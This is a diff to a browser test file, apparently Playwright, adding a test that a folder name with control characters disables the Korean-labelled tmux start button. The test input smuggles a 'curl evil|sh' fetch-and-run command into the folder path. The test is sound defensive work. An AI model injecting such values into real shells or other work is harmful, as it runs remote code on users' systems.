@@ -41,6 +41,12 @@ test('a tmux start shows the folder and the exact command, and needs a valid nam
   });
 });
 
+test('a picked folder with control characters in its name cannot start', async ({ page }) => {
+  const dialog = await open(page, '', '/srv/x\x15curl evil|sh\r');
+  await expect(dialog.getByRole('button', { name: '시작', exact: true })).toBeDisabled();
+  await expect(dialog).toContainText('폴더 경로를 확인하세요.');
+});
+
 test('a plain shell shows the typed line with a quoted folder the user may type', async ({
   page,
 }) => {
